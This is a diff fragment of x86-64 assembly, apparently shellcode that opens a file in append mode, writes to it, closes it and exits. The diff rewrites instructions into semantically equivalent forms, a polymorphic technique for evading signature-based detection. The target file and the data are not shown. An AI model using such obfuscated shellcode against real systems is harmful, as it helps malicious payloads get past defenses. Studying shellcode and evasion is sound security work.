@@ -20,8 +20,12 @@ _start:
     push r8
     add rdi, rsp
     ;xor rsi, rsi
-    xor esi, esi		; opcode reduction
-    add si, 0x401
+;    add si, 0x401
+	push 1			; symatically equiv
+	add word [rsp], 0x411	
+	pop rsi			
+	sub rsi, 0x10		
+
     syscall
 
     ;write
@@ -29,7 +33,7 @@ _start:
 ;    xor rax, rax
  ;   add rax, 1 ; syscall for write
 	push byte 1		; symatically equiv
-	pop rax			; symatically equiv 
+	pop rax			
     jmp data
 
 write:
@@ -38,20 +42,20 @@ write:
     syscall
 
 	xchg r10, rbp		; nop equiv
-	dec r10			; nop equiv 
+	dec r10			
 
     ;close
 ;    xor rax, rax
 ;    add rax, 3
 	push byte 3		; symantically equiv
-	pop rax			; symantically equiv 
+	pop rax			
     syscall
 
     ;exit
 ;    xor rax, rax
  ;   mov al, 60
 	push byte 60		; symatically equiv 
-	pop rax			; symatically equiv 
+	pop rax			
  ;   xor rdi, rdi
 	xor edi, esi		; opcode reduction
 	
